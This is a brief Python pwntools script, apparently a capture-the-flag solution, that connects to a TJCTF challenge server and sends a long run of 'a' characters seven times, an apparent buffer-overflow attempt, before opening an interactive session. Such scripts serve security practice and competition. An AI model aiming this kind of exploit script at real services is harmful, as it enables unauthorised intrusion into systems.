#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
io = remote('problem1.tjctf.org', 8001)

for i in range(7):
	io.sendlineafter(': ','a'*100)
io.interactive()
